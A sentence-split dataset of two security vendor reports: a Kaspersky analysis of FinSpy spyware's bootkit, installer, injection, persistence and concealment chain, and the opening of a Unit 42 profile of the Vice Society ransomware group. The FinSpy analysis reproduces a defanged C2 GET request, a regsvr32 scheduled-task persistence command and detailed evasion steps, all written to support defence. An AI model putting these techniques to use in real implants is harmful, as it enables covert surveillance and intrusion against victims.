sentence.3239: title: FinSpy: unseen findings url: https://securelist.com/finspy-unseen-findings/104322/ FinSpy, also known as FinFisher or Wingbird, is an infamous surveillance toolset.
sentence.3240: Kaspersky has been tracking deployments of this spyware since 2011.
sentence.3241: Historically, its Windows implant was distributed through a single-stage installer.
sentence.3242: This version was detected and researched several times up to 2018.
sentence.3243: Since that year, we observed a decreasing detection rate of FinSpy for Windows.
sentence.3244: While the nature of this anomaly remained unknown, we began detecting some suspicious installers of legitimate applications, backdoored with a relatively small obfuscated downloader.
sentence.3245: We were unable to cluster those packages until the middle of 2019 when we found a host that served these installers among FinSpy Mobile implants for Android.
sentence.3246: Over the course of our investigation, we found out that the backdoored installers are nothing more than first stage implants that are used to download and deploy further payloads before the actual FinSpy Trojan.
sentence.3247: Apart from the Trojanized installers, we also observed infections involving usage of a UEFI or MBR bootkit.
sentence.3248: While the MBR infection has been known since at least 2014, details on the UEFI bootkit are publicly revealed in this article for the first time.
sentence.3249: We decided to share some of our unseen findings about the actual state of FinSpy implants.
sentence.3250: We will cover not only the version for Windows, but also the Linux and macOS versions, since they have a lot of internal structure and code similarities.
sentence.3251: The full details of this research, as well as future updates on FinSpy, are available to customers of the APT reporting service through our Threat Intelligence Portal.
sentence.3252: Contact: intelreports@kaspersky.com UEFI infection During our research, we found a UEFI bootkit that was loading FinSpy.
sentence.3253: All machines infected with the UEFI bootkit had the Windows Boot Manager (bootmgfw.efi) replaced with a malicious one.
sentence.3254: When the UEFI transfers execution to the malicious loader, it first locates the original Windows Boot Manager.
sentence.3255: It is stored inside the efi\microsoft\boot\en-us\ directory, with the name consisting of hexadecimal characters.
sentence.3256: This directory contains two more files: the Winlogon Injector and the Trojan Loader.
sentence.3257: Both of them are encrypted with RC4.
sentence.3258: The decryption key is the EFI system partition GUID, which differs from one machine to another.
sentence.3259: Sample contents of the \efi\microsoft\boot\en-us\ directory Once the original bootloader is located, it is loaded into memory, patched and launched.
sentence.3260: The patched launcher: Patches the function of the OS loader that transfers execution to the kernel The patched function hooks the kernel’s PsCreateSystemThread function, which, when called for the first time, creates an additional thread that decrypts the next loader stage and launches it.
sentence.3261: The next stage: Locates the Trojan loader file on the EFI partition and decrypts it Waits until a user logs on and injects the Trojan loader into exe.
sentence.3262: The Trojan loader: Extracts the Trojan from resources and drops it under the name dll Decrypts the Trojan with a XOR-based cipher and unpacks it with aPLib Reflectively loads and launches the Trojan.
sentence.3263: MBR infection Older machines that do not support UEFI can be infected through the MBR.
sentence.3264: When the victim machine starts up, the infected MBR copies the initial loader code from the last megabyte of the hard drive to the highest available memory located before the EBDA1.
sentence.3265: This code hooks the 13h and 15h BIOS interrupts and then launches the original MBR.
sentence.3266: The 15h interrupt makes sure that the Windows loader does not overwrite the copied code.
sentence.3267: When this interrupt is called to get the size of the area before the EBDA, the hook will reduce the amount of available memory.
sentence.3268: As for the 13h interrupt hook (which manages reading information from disk), it patches the OS loader when it is read from disk.
sentence.3269: Just as in the case with the EFI infection, the hooked functions place their own hooks on further OS loading stages.
sentence.3270: The last hook in the chain creates a thread in the kernel that injects the next stage into winlogon.exe.
sentence.3271: In case the infection is installed on a 32-bit machine, the process of injecting code into winlogon.exe is more complex than the one observed in the UEFI infection.
sentence.3272: It is as follows: A thread with trampoline shellcode is created inside exe.
sentence.3273: This shellcode duplicates the exe process handle and transfers it to explorer.exe.
sentence.3274: The shellcode injects another trampoline shellcode in Explorer.
sentence.3275: The second shellcode makes exe inject the Trojan loader back into winlogon.exe.
sentence.3276: This roundabout way of injecting code is intended to trick security solutions.
sentence.3277: The injected Trojan loader is the same as the UEFI one.
sentence.3278: User Mode Infection Overview This infection is by far the most complex.
sentence.3279: In short, the attack scenario is as follows:
sentence.3280: The victim downloads a Trojanized application and executes it.
sentence.3281: During its normal course of operation the application connects to a C2 server, downloads and then launches a non-persistent component called the Pre-Validator.
sentence.3282: The Pre-Validator ensures that the victim machine is not used for malware analysis.
sentence.3283: The Pre-Validator downloads Security Shellcodes from the C2 server and executes them.
sentence.3284: In total, it deploys more than 30 shellcodes.
sentence.3285: Each shellcode collects specific system information (e.g. the current process name) and uploads it back to the server.
sentence.3286: In case a check fails, the C2 server terminates the infection process.
sentence.3288: If all security checks pass, the server provides a component that we call the Post-Validator.
sentence.3289: It is a persistent implant likely used to ensure that the victim is the intended one.
sentence.3290: The Post-Validator collects information that allows it to identify the victim machine (running processes, recently opened documents, screenshots) and sends it to a C2 server specified in its configuration.
sentence.3291: Depending on the information collected, the C2 server may command the Post-Validator to deploy the full-fledged Trojan platform or remove the infection.
sentence.3292: Overview of the user mode infection Trojanized applications Throughout our research, we identified numerous legitimate applications backdoored with FinSpy.
sentence.3293: Examples include software installers (e.g. TeamViewer, VLC Media Player, WinRAR) as well as portable applications.
sentence.3294: All observed backdoored application samples have their original digital signature.
sentence.3295: It is invalid, which indicates that the application has been patched.
sentence.3296: While the entry point function of the application looks clear, inspection of the executable’s PE file sections does reveal anomalies: the backdoored application has its last section (.rsrc on the screenshot below) expanded by 51 KB. Sections of the original (left) and backdoored (right) application Apart from that, a part of code from the .text section (roughly 8 KB) is overwritten with heavily obfuscated code, with the original application code placed in the expanded last section.
sentence.3297: When the backdoored application launches, it runs as normal, i.e. the inserted obfuscated code does not impact the application workflow.
sentence.3298: At some point the application executes a jump instruction that redirects execution to the obfuscated trampoline in the .text section.
sentence.3299: This instruction appears to be placed randomly in the code.
sentence.3300: For example, a call to the CreateWindowExW function has been replaced: The original (left) and patched (right) code of the backdoored application This trampoline is protected with an obfuscator that we dubbed FinSpy Mutator.
sentence.3301: It launches a code that: Decrypts and launches a slightly modified Metasploit Reverse HTTPS stager.
sentence.3302: The decryption procedure: Is obfuscated with FinSpy Mutator Involves applying 10 operations (ADD, SUB, XOR, ROL, ROR) to every byte of the stager Is different in every backdoored installer.
sentence.3303: Restores the code in the .text section that was overwritten with the malicious code (recall that the original code is saved in the resource section)
sentence.3304: Resolves relocations in the restored code Restores the instruction that has been overwritten with a jump Jumps to the restored instruction, thus resuming the execution of the original application.
sentence.3305: The Metasploit stager connects to a configured C2 server using HTTPS for communication.
sentence.3306: In the case of 5EDF9810355DE986EAD251B297856F38, the stager sends the following GET request to the C2 server:GET https://45[.]86[.]163[.]138/blog/ASVn6Wg5VbnZxiG2PSVbaSa-G8PmI2ew2zFBQGEZbDUEmx9mE88dw0Zxmu-AeuheOJYJ1F6kTh6uA0UJDkfISp--k6bGNOuULoTSlr-AXwvWapnFLOe4QEpqY_pe3uoGC88y3JqiQifHlRRqcE9whGX_-X14BIv35Q HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0 Host: 45[.]86[.]136[.]138 Connection: Keep-Alive Cache-Control: no-cache The C2 server replies with a component that we called the Pre-Validator in response to the GET request.
sentence.3308: The Pre-Validator The Pre-Validator is a shellcode obfuscated with FinSpy Mutator.
sentence.3309: On startup, it: Hooks the NtTerminateProcess and ExitProcess functions to make sure the Pre-Validator continues working if the backdoored application is closed.
sentence.3310: The hooked functions close all the application’s windows but do not terminate its process.
sentence.3311: Makes an initial POST request to the C2 server.
sentence.3312: Example of the request URL: https://45[.]86[.]163[.]138/blog/index.asp?attachmentid=a46dee635db8017962741f99f1849471&d=5d7e89e6b4874d0df95141bd923556f8 (all parts of this URL vary between samples).
sentence.3313: All communications between the server are encrypted with RC4.
sentence.3314: The reply to the initial POST request contains a shellcode that we called a Security Shellcode.
sentence.3315: On receiving it, the Pre-Validator: Decrypts and executes the received Security Shellcode Sends the shellcode execution results to the C2 server via a POST request.
sentence.3316: Receives the next Security Shellcode from the C2 server and repeats the steps above.
sentence.3317: The nature of these shellcodes indicates that they are used to fingerprint the system and verify that it is not used for malware analysis.
sentence.3318: It is important to highlight that the shellcodes only collect the data, all the checks are performed server-side.
sentence.3319: In case a shellcode uploads suspicious execution results (e.g. the Pre-Validator is running on a virtual machine), the server provides a shellcode that terminates the Pre-Validator.
sentence.3320: The received shellcodes are protected with either FinSpy Mutator, an obfuscator resembling OLLVM or both these protectors.
sentence.3321: In total, we observed 33 Security Shellcodes provided by the server (listed in execution order): Shellcode # Description 1 Attempts to detect a hypervisor with the CPUID (EAX = 1) instruction.

sentence.3344: Once all security checks are passed, the C2 server sends a shellcode that downloads and runs the Post-Validator Installer.
sentence.3345: The Post-Validator Installer This module is an obfuscated shellcode.
sentence.3346: It: Creates a subdirectory (name differs between samples) in the C:\ProgramData directory Drops two files in the newly created subdirectory: The Post-Validator Loader DLL
sentence.3347: A shellcode with the Post-Validator itself.
sentence.3348: The file names are hardcoded in the dropper but are unique for each sample and appear to be randomly generated.
sentence.3349: Creates a scheduled task that runs at system startup and launches the Post-Validator Loader via regsvr32 (task action:
sentence.3350: %windir%\syswow64\regsvr32.exe /s “<path to the Loader DLL>”) After the Post-Validator is installed, the Pre-Validator shuts down.
sentence.3351: The Post-Validator Loader The Post-Validator Loader is a huge (3-9 MB) obfuscated DLL.
sentence.3352: The Task Scheduler launches it at system startup through regsvr32.exe.
sentence.3353: Its main function is several megabytes in size, but despite that, its purpose is simple: read and execute a shellcode that is stored in the same directory as the Post-Validator Loader.
sentence.3354: Sample scheduled task properties The launched shellcode decrypts the Post-Validator (it is stored in the same file with the shellcode) with RC4 (key: domain SID) and reflectively loads it.
sentence.3355: The Post-Validator The Post-Validator is a DLL obfuscated with VMProtect.
sentence.3356: This module uses the same communication protocol that is used in the main Trojan component:
sentence.3357: The TLV (type-length-value) format to exchange data with C2 servers TLV type constants that are found in the Trojan The Trojan’s Cryptography Library to encrypt/decrypt exchanged data On startup, the Post-Validator verifies that it is not launched inside a sandbox environment.
sentence.3358: It then starts communication with C2 servers specified in its configuration, sending heartbeat messages with 15-minute intervals.
sentence.3359: Each heartbeat includes brief information about the victim machine.
sentence.3360: The heartbeat reply may contain different commands.

sentence.3369: When the Post-Validator receives the Trojan Installer (which is a DLL), it: Reflectively loads and launches the Installer
sentence.3370: Depending on the configuration, either uninstalls itself (by deleting its directory and the scheduled task) or goes to sleep until system reboot.
sentence.3371: Based on the data collected by the Post-Validator, it is most likely that: The Post-Validator is deployed to ensure that the infected victim is the intended one.
sentence.3372: The C2 server operator manually analyzes data received from the victim and commands to either remove the Post-Validator or infect the machine with the Trojan.
sentence.3373: The Post-Validator is another obstacle for researchers.
sentence.3374: Even if they manage to pass all the checks of the Pre-Validator, the C2 server operator may refuse to infect a suspicious machine.
sentence.3375: The Trojan Installer The Installer creates the working directory (path: %localappdata%\Microsoft\<two concatenated English words>) and sets it as being accessed, modified and created a year earlier.
sentence.3376: Afterwards, it drops the following files to it: File name Description <4 random hexadecimal characters>.cab The setup configuration file, which is encrypted with RC4 (key: the name of the working directory).
sentence.3377: Names differ between samples The encrypted VFS file.
sentence.3379: msvcr90.dll The Trojan bundle, encrypted with XOR and compressed with aPLib. msvcr120d.dll 64-bit Trojan loader.
sentence.3380: The executable is prepended with 0x4000 random bytes and encrypted with RC4 (key: machine GUID) msvcr140d.dll 32-bit Trojan loader, also prepended with random bytes and encrypted with RC4.
sentence.3381: The timestamps of dropped files are set to one year earlier than the current date.
sentence.3382: Once the working directory is prepared, the Installer launches the Trojan.
sentence.3383: The Initial Loader The Initial Loader is a DLL that is launched on every startup by rundll32.exe (the Trojan adds it to the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run key, the value name is unique for each sample).
sentence.3384: The size of the Initial Loader exceeds 5 MB.
sentence.3385: It is obfuscated with a protector resembling the open source OLLVM obfuscator.
sentence.3386: Despite its size, the only functionality of the Initial Loader is to decrypt and launch the 32-bit Trojan Loader.
sentence.3387: The Trojan Loader The 32-bit Trojan Loader, which is launched regardless of the victim machine architecture, checks if it is running on a 64-bit system.
sentence.3388: If so, it reads the 64-bit loader (msvcr120d.dll) from disk and runs it as a shellcode.
sentence.3389: The Trojan Loader (either the 32-bit or the 64-bit one): Reads the Trojan bundle file (dll), decrypts it with XOR and unpacks with aPLib.
sentence.3390: Injects the Trojan DLL into exe by either calling CreateRemoteThread or using the KernelCallbackTable technique.
sentence.3391: MacOS Infection The macOS version of the malware is not as complicated as the Windows one.
sentence.3392: It is written in Objective-C. An obfuscator similar to OLLVM is used to protect FinSpy for Mac.
sentence.3393: Additionally, Objective-C selectors that may reveal information about method names contain junk.
sentence.3394: The macOS version of FinSpy has the following components: The Installer.
sentence.3395: Unlike the Windows version that features numerous installers, the macOS version has only one installer type.
sentence.3398: The Trojan that consists of the Orchestrator, the Cryptography Library and plugins.
sentence.3399: The Installer When the victim executes the malicious app, an executable located at the <malicious application name>.app/Contents/MacOS/installer path is launched.
sentence.3400: On startup, it checks the environment for debuggers and virtual machines.
sentence.3401: It drops the following files to the machine: Path Description /Library/Frameworks/Storage.framework A directory with the Trojan inside /private/etc/logind The Trojan loader that runs as a launch agent.
sentence.3402: This file is executed on startup.
sentence.3403: /Library/LaunchAgents/logind.plist The configuration of the logind agent.
sentence.3404: The Trojan needs it in order to maintain persistence.
sentence.3405: All copied files are timestomped (modification date is the timestamp of Finder.app).
sentence.3406: The Installer sets their owner to root:wheel.
sentence.3407: It additionally sets the SUID and SGID bits of the /private/etc/logind file.
sentence.3408: By copying the logind.plist file to the /Library/LaunchAgents directory the Installer configures the Trojan to load at startup.
sentence.3409: The Installer then launches the logind executable (Trojan Loader) with the launchctl utility.
sentence.3410: The Initial Loader The Initial Loader (/private/etc/logind) launches every time when the operating system boots up.
sentence.3411: Once launched, The Initial Loader launches the Trojan Loader (/Library/Frameworks/Storage.framework/Contents/MacOS/logind).
sentence.3412: The Trojan Loader The Trojan Loader has a constructor function that is invoked before main.
sentence.3413: It sets hooks on functions that load application bundles.
sentence.3414: These hooks allow the Trojan to load plugins while decrypting them on the fly.
sentence.3415: Once the hooks are placed, the Trojan Loader launches the Orchestrator (/Library/Frameworks/Storage.framework/Contents/Resources/dataPkg).
sentence.3416: The Orchestrator (as well as plugins) are packed with aPLib and encrypted with AES.
sentence.3417: When the Orchestrator is unpacked, it is reflectively loaded.
sentence.3418: Linux Infection The Linux version of FinSpy is protected with an obfuscator similar to OLLVM.
sentence.3419: It has the same components as in the macOS version (Initial Loader, Trojan Loader, Orchestrator and plugins).
sentence.3420: The Installer Infection vectors used to deliver FinSpy for Linux are unknown.
sentence.3421: The leaked FinFisher support questions database suggests physical access could be used to infect machines:

sentence.3455: The Trojan Overview of the Windows Trojan components The Windows version of the Trojan consists of the following components: The Hider, the first launched component.
sentence.3456: It starts the Orchestrator and conceals memory areas that contain the Trojan components’ code and data.
sentence.3457: The Orchestrator, a DLL which is responsible for managing installed plugins and preparing data to be sent to the C2 server Plugins, DLL modules that perform malicious activities on the victim machine The virtual file system (VFS) which allows the Orchestrator and other plugins to seamlessly interact with plugins and their configurations The ProcessWorm module which intercepts system activity.
sentence.3458: Similar to a network worm which infects machines in the local network, the ProcessWorm is injected into all running processes.
sentence.3459: Once a process is infected, the ProcessWorm spreads to its children.
sentence.3460: The Communicator module which sends data to the C2 server and receives replies The Hider The Hider is the first launched component of the Backdoor.
sentence.3461: It is a valid PE file protected with the FinSpy VM.
sentence.3462: On startup, the Hider loads a clean copy of ntdll.dll from disk, which is used when calling API functions from this library.
sentence.3463: After that, it decrypts the Orchestrator, which is stored in the Hider’s resource section.
sentence.3464: It is encrypted with a 256-byte RC4 key.
sentence.3465: which is unscrambled at runtime using addition, subtraction and XOR operations.
sentence.3466: The key may vary from one sample to another.
sentence.3467: A snippet of the RC4 key generation function After decrypting and unpacking the Orchestrator, the Hider reflectively loads it.
sentence.3468: The hiding functionality Before transferring execution to the Orchestrator’s entry point, the Hider activates its concealing functionality.
sentence.3469: It works as follows: The Hider encrypts the Orchestrator’s pages with a cipher based on XOR and ROL operations and assigns the PAGE_NOACCESS attribute to them When the Orchestrator accesses hidden pages, the operating system generates an ACCESS_VIOLATION exception The Hider detects the generated exception through the hook of the KiUserExceptionDispatcher function, which handles dispatching of all exceptions The hooked function decrypts the hidden page and assigns it the PAGE_EXECUTE_READWRITE attribute, thus handling the exception The Hider conceals the unhidden pages again within 30 seconds.
sentence.3470: The Hider also protects plugins loaded by the Orchestrator.
sentence.3471: The Orchestrator The Orchestrator is the core module of the Trojan that controls all plugins and manages C2 server communications.
sentence.3472: When the Orchestrator starts up, it: Hooks its own IAT (import address table) to alter the behavior of WinAPI file manipulation functions.
sentence.3473: The Orchestrator needs these hooks to interact with the VFS.
sentence.3474: Sets up persistence by creating an entry in the HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry key.
sentence.3475: Reads the Orchestrator configuration and loads installed plugins.
sentence.3476: An interesting fact about the Orchestrator is that it erases its PE structures and code of initialization procedures.
sentence.3477: This trick is designed to make it more difficult to detect this component in memory and conduct analysis of its dumps.
sentence.3478: Once initialized, the Orchestrator launches its following components, which we will detail below: The application watcher that looks for specific processes and notifies the C2 server when they are started or stopped The ProcessWorm injector that injects the ProcessWorm into processes that are not infected with this component The recording manager thread that controls data to be exfiltrated to the C2 server The C2 server communicator thread.
sentence.3479: The application watcher The application watcher regularly examines all the processes on the system, looking for applications specified in the Orchestrator configuration.
sentence.3480: When it detects a starting first (or a stopping last) instance of a process from the list in the configuration, an appropriate event will be reported to the C2 server during heartbeat time.
sentence.3481: It is notable that the application watcher acquires handles for all running processes on the system, which results in either winlogon.exe or explorer.exe obtaining numerous process handles.
sentence.3482: Process handles acquired by explorer.exe on a clean system (left) and on an infected system with the Orchestrator residing inside the explorer.exe process (right)
sentence.3483: The ProcessWorm injector The ProcessWorm injector thread ensures that the ProcessWorm is running in every process which can be accessed by the Orchestrator.
sentence.3484: Just like the application watcher, the injector regularly obtains the list of running processes.
sentence.3485: For every process, it verifies whether the ProcessWorm is running inside it and injects the ProcessWorm if needed.
sentence.3486: The recording manager Over the course of their execution, plugins may save recording files in the working directory (e.g. keylogs, screenshots or printed files).
sentence.3487: The recording manager is tasked with two duties: Periodically checking whether there are recording files available to be sent to the C2 server Preparing recording files to be uploaded when their download is requested by the C2 server.
sentence.3488: Every recording file stored in the working directory has the following name format: <plugin prefix><recording type prefix><five-digit random number>.<extension> The plugin prefix, the extension and the recording type prefix depend on the ID of the plugin that created the recording.
sentence.3489: The Orchestrator has arrays which converts IDs to prefixes and extensions.
sentence.3490: Possible plugin prefixes: auth, avi, cert, crt, com, mem, sxs, msvc, dmem, mtx, net, nls, odbc, ole, pnp, ssl, win, vm, vsc, ntos, user, run, cvs, cvg, con, ssy Recording type prefixes: inf, sys, doc, mem, vmx, net, run, dat, dll.
sentence.3491: Filename extensions used: doc, vmx, net, xls, zip.
sentence.3492: The C2 server communication thread This thread is responsible for maintaining communication with the C2 server.
sentence.3493: In particular, it contacts the C2 server, sends heartbeats messages and receives commands.
sentence.3494: The thread dispatches received commands to plugins and sends their execution results back to the server.
sentence.3495: Below is a list of the Orchestrator commands: Command ID Description Commands related to recordings 0x8072A0 Upload a recording file with a specified name to the C2 server.
sentence.3496: 0x8076A0, 0x807AA0 Delete a recording with a given filename from the system.
sentence.3497: 0x8078A0 Retrieve the list of all the recordings present on the victim machine.
sentence.3498: 0x8070A0 Retrieve the list of recordings made by a plugin with the specified ID.
sentence.3499: Commands related to the configuration 0x8030A0 Send the current configuration to the server.
sentence.3501: Commands related to plugins 0x8009A0 Send a list of installed plugins to the server. 0x8054A0, 0x805BA0
sentence.3502: Commence the plugin installation process by creating a temporary file in the working directory.
sentence.3503: 0x8056A0, 0x805DA0 Append a plugin body chunk to the temporary plugin file created by the previous command. 0x8057A0, 0x805EA0 Finalize the plugin installation process.
sentence.3504: This command moves the contents of the temporary file to the virtual file system and loads the new plugin.
sentence.3505: 0x8059A0 Uninstall a plugin from the machine.
sentence.3506: This command unloads the specified plugin and removes it from the VFS.
sentence.3509: This command wipes all the files and registry keys created by the backdoor, as well as restores the MBR and the EFI Windows Boot Manager (provided they were infected) from backups.
sentence.3510: 0x807DA0 Close the current C2 server connection.
sentence.3512: The Communicator module The malware configuration includes one or multiple C2 servers which it can connect to.
sentence.3513: In case one of the servers is down, the backdoor uses one of the fallback addresses.
sentence.3514: FinSpy does not communicate with C2 servers directly from winlogon.exe or explorer.exe.
sentence.3515: Instead, it spawns a default browser process with a hidden window and injects the Communicator module in it.
sentence.3516: This is done to make communications look legitimate.
sentence.3517: The Virtual File System component The Virtual File System is the place where all the plugin executables and their configurations hide.
sentence.3518: All the virtual files are stored in a single “real” file, which is encrypted with RC4 and has the following structure: File offset Description 0x0 CRC32 checksum of the file (the checksum computation starts from offset 4) VFS entry #1 0x4 ID of the plugin corresponding to the file.
sentence.3519: The Orchestrator configuration is stored on the VFS with ID 0xFFFFFFFE.
sentence.3520: 0x8 0x0 if the file is a plugin configuration, 0x2 if it is a plugin executable.
sentence.3524: VFS entry #2 … The last VFS entry has the ID equal to 0xFFFFFFFF and zero size.
sentence.3525: It serves as the VFS end marker.
sentence.3527: The VFS is accessed via file management functions hooked by the Orchestrator.
sentence.3528: For example, virtual files can be created or opened via the hooked CreateFileW API.
sentence.3529: The return value of the hooked file creation function is a VFS handle, which is a number of the format 0xFF000XXX.
sentence.3531: The malware injects the ProcessWorm into all processes running on the system.
sentence.3532: Its main purpose is to extract specific information about running processes and send it to the Orchestrator or the plugins.
sentence.3533: The ProcessWorm is a DLL wrapped in a shellcode and obfuscated with FinSpy VM.
sentence.3534: The ProcessWorm can be injected to processes in two ways – either by spawning a remote thread with the shellcode or by creating an APC (Asynchronous Procedure Call) with the procedure address pointing to the start of the shellcode.
sentence.3535: The latter one is used when the ProcessWorm is injected into newly created processes.
sentence.3536: The loader code behaves differently depending on the chosen injection type.
sentence.3537: While the loader used with the first injection method is simple, the one invoked in case of APC injections is rather interesting.
sentence.3538: The asynchronous procedure places a hook on the NtTestAlert function and then exits.
sentence.3539: When the process executable is loaded, ntdll.dll will call the NtTestAlert function.
sentence.3540: Its modified version will first call the original NtTestAlert function and then invoke the ProcessWorm reflective loader.
sentence.3541: The ProcessWorm reflective loader comes with a twist.
sentence.3542: When it processes imports, it does not assign a function pointer to each entry in the IAT.
sentence.3543: Instead, IAT entries point to buffers of randomly generated junk code.
sentence.3544: This code obtains the address of the destination API function by XOR-ing two numbers and then jumps to it.
sentence.3545: Example of junk code created by the ProcessWorm loader, useful instructions are highlighted in yellow While executing its worm-like activity, the ProcessWorm injects itself into processes created by the process that are already infected with this component.
sentence.3546: To do that, it places a hook on the CreateProcessInternalW API function.
sentence.3547: If the new process is not created with a DEBUG_PROCESS or a DEBUG_ONLY_THIS_PROCESS flag, the hooked process creation function clears a possible hook of the NtQueueAPCThread function and then uses it to create an APC procedure in the new process.
sentence.3548: When the new process starts up, the ProcessWorm will be loaded with the help of the APC injection loader.
sentence.3549: Depending on the malware configuration, the ProcessWorm may hide the presence of FinSpy on the victim machine.
sentence.3550: It can conceal the malware’s working directory, services, registry keys, C2 server addresses, as well as filter out event logs related to the malicious activity.
sentence.3551: The ProcessWorm achieves stealth by hooking low-level API functions (such as NtEnumerateValueKey or NtQuerySystemInformation)
sentence.3552: The rest of the malicious activity is dispersed across hooks of various WinAPI functions.
sentence.3553: They are placed in order to provide information to the plugins bundled with the malware.
sentence.3554: Examples of such information are typed keystrokes or documents sent to the printer.
sentence.3555: The macOS and Linux Orchestrator The macOS/Linux orchestrator is a simplified version of the Windows orchestrator.
sentence.3556: Unlike the Windows version, it does have the following components: The Virtual File System (plugins and configurations are stored in separate files)
sentence.3557: The ProcessWorm (its functionality is embedded into plugins)
sentence.3558: The communicator module (the Orchestrator exchanges data with C2 servers without additional modules)
sentence.3559: The application watcher (the Orchestrator does not report started or stopped processes to C2 servers) The functionalities of the Orchestrator remain the same: exchanging information with the C2 server, dispatching commands to plugins and managing recording files.

sentence.3577: Profiling a Persistent Threat to the Education Sector url: https://unit42.paloaltonetworks.com/vice-society-targets-education-sector/ Executive Summary Vice Society is a ransomware gang that has been involved in high-profile activity against schools this year.
sentence.3578: Unlike many other ransomware groups such as LockBit that follow a typical ransomware-as-a-service (RaaS) model, Vice Society’s operations are different in that they’ve been known for using forks of pre-existing ransomware families in their attack chain that are sold on DarkWeb marketplaces.
sentence.3579: These include the HelloKitty (aka FiveHands) and Zeppelin strains of ransomware as opposed to Vice Society developing their own custom payload.
sentence.3580: In September 2022, a joint Cybersecurity Advisory (CSA) from the FBI, CISA and the MS-ISAC declared they had recently observed Vice Society actors disproportionately targeting the education sector with ransomware attacks.
sentence.3581: The CSA continued that attacks could increase as the 2022-23 school year begins and criminal ransomware groups perceive opportunities for successful attacks.
sentence.3582: Vice Society first surfaced in the summer of 2021, and in that time frame it was seen exploiting the CVE-2021-34527 (aka PrintNightmare) vulnerability as part of their attack chain.
sentence.3583: The gang is also known to target backups and exfiltrate data from compromised systems to be leveraged for the purpose of double extortion, a common ransomware operation tactic where victims are pressured to pay a specified ransom amount in exchange for decryption and to avoid having sensitive data published on the attacker’s dedicated leak site.
sentence.3584: Palo Alto Networks customers receive protections against ransomware used by Vice Society from Cortex XDR, as well as from the WildFire cloud-delivered security service for the Next-Generation Firewall.
sentence.3585: The Unit 42 Incident Response team can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.
sentence.3586: Table of Contents Vice Society Activity TimelineStudy of Vice Society’s VictimsGeographical ImpactImpacted Industry VerticalsLeak Site Metric ComparisonsUnit 42 Incident Response Data on Vice SocietyVice Society Technical DetailsLeak Site SynopsisHelloKitty UsageZeppelin UsageConclusionTactics, Techniques and Procedures (TTPs)Indicators of Compromise (IoCs)Additional Resources Vice Society Activity Timeline Early reports of the extortion group Vice Society were shared on Twitter by malware researchers such as Michael Gillespie.
sentence.3587: These tweets depicted HelloKitty ransomware payloads appending a .v-society extension to encrypted files on June 10, 2021.
sentence.3588: Since then, Vice Society has used a variety of different ransomware strains including the following notable examples: In June 2021, Vice Society infected victims with HelloKitty.
sentence.3589: In 2021 and 2022, Vice Society used Zeppelin to target Windows hosts.
sentence.3590: During their 2021 infections, these attackers also exploited vulnerabilities such as PrintNightmare to escalate privileges and spread laterally across targeted networks.
sentence.3591: Based on leak site activity we’ve observed in recent months, as shown in Figure 1, we saw a subtle spike at the turning point from 2021 to 2022.
sentence.3592: This was followed by one large spike of activity at the end of spring 2022.
sentence.3594: Vice Society activity timeline (all leak site victim data).Fast forward to fall 2022, when we saw another wave of Vice Society activity across the education sector, as shown in Figure 2, which prompted a flood of advisories and reports about the group.
sentence.3595: The noticeable spikes in spring and fall give us a hint at some of their motivations.
sentence.3596: As education organizations are the group’s prime target, this could be an indication that they’re timing campaigns to coincide with this sector’s unique calendar year.
sentence.3597: The school year for most educational institutions in the U.S. typically starts in late August-September and ends in June.
sentence.3598: They might have been trying to time their attacks in 2022 with the transitions of the beginning and end of the school year.
sentence.3600: Vice Society activity timeline (education-specific leak site victim data).Study of Vice Society’s Victims Vice Society is notorious for targeting the education sector – K-12 and higher education institutions in particular (as referenced in the recent CISA Advisory).
sentence.3601: Other targeted sectors include healthcare and nongovernmental organizations (NGOs).
sentence.3602: Common targets are small- to medium-size businesses, with no geographical focus apparent at this time.
sentence.3603: Rather, as noted in a report by SOCRadar, Vice Society focuses on targets of opportunity.
sentence.3604: For years, sectors such as education and healthcare have suffered from many challenges in combating ransomware that have made them particularly attractive targets.
sentence.3605: A lack of budgeting for systems and security solutions has led many organizations to run legacy hardware that isn’t patched against the latest vulnerabilities.
sentence.3606: Other challenges that could increase the overall attack surface of these organizations include difficulties in controlling and managing a large number of personal devices brought in by students and staff members.
sentence.3607: These personal devices introduce inherent risk because they may interact with personal files via cloud services.
sentence.3608: Although these sectors might have dedicated IT or security teams that run traditional security solutions such as an intrusion detection system (IDS) or intrusion prevention system (IPS), ransomware threat actors are leveraging living off the land techniques that can effectively circumvent traditional signature-based detection mechanisms.
sentence.3609: These tactics require an extended detection and response (XDR) platform for more robust behavioral monitoring within a network.
sentence.3610: The education and healthcare sectors also experience the common challenge of finding staff who are adequately trained to handle the ongoing threat of ransomware.
sentence.3611: And lastly, many of these organizations are charged with protecting some of the most sensitive and valuable personally identifiable information (PII) of any business sector.
sentence.3612: Geographical Impact Vice Society is primarily opportunistic, and its targets have included organizations across the globe.
sentence.3613: The group has infected organizations based in all regions, as shown in Figures 3 and 4, with the largest numbers in the U.S., followed by the U.K., Spain, France, Brazil, Germany and Italy. Figure 3.

sentence.3617: The CISA advisory mentions how Vice Society has disproportionately targeted educational institutions in the United States.
sentence.3618: Looking at leak site data in more detail, the group appears to be targeting more educational organizations based in California, as shown in Figure 5.
sentence.3620: Vice Society United States victimology (all leak site victim data).Impacted Industry Verticals Although Vice Society has been in the headlines for targeting educational organizations, they also extort victims in many other industry verticals, as shown in Figure 6, including those supplying critical infrastructure, such as healthcare, government entities and manufacturing.

sentence.3623: According to analysis of ransomware leak sites, Unit 42 has identified Vice Society as being in the top 10 of the most impactful ransomware gangs of 2022.
sentence.3624: We estimate that, since it started operations in 2021, Vice Society has impacted more than 100 organizations in total.
sentence.3625: More than 90 of the total published leak site infections occurred in the year 2022 alone.
sentence.3626: Leak site data suggests that Vice Society has had the highest impact on education organizations this year, with at least 33 educational institutions having been listed on the group’s dedicated ransomware leak site.
sentence.3627: This impact is closely followed by ransomware families such as LockBit 2.0 and 3.0, as shown in Figure 7. Figure 7.

sentence.3629: 42 Incident Response Data on Vice Society Since Vice Society’s inception in 2021, Unit 42 has performed incident response (IR) engagements with clients who have been impacted by Vice Society.
sentence.3630: Let’s look at some of the data from these incidents.
sentence.3632: In Unit 42 IR cases regarding Vice Society, we observed dwell times as high as six days.
sentence.3633: This represents the time elapsed between the date of initial compromise and the date of initial discovery.
sentence.3634: Ransom Demands When tracking ransomware group operations, Unit 42 takes note of the initial and final ransom demands made by each ransomware group.
